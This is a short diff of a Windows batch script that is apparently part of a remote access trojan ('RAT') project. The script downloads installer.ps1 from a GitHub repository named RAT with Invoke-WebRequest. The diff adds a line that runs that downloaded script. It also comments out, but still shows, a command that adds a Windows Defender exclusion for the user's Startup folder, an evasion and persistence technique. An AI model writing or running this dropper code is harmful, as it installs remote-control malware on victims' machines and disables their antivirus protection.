@@ -39,8 +39,9 @@ REM rat ressources
 
 powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/installer.ps1 -OutFile installer.ps1";
 
+powershell "./installer.ps1"
 
-Add-MpPreference -ExclusionPath "C:\Users\user\%username%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"; "./installer.ps1"
+@REM Add-MpPreference -ExclusionPath "C:\Users\user\%username%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"; "./installer.ps1"
 
 
 
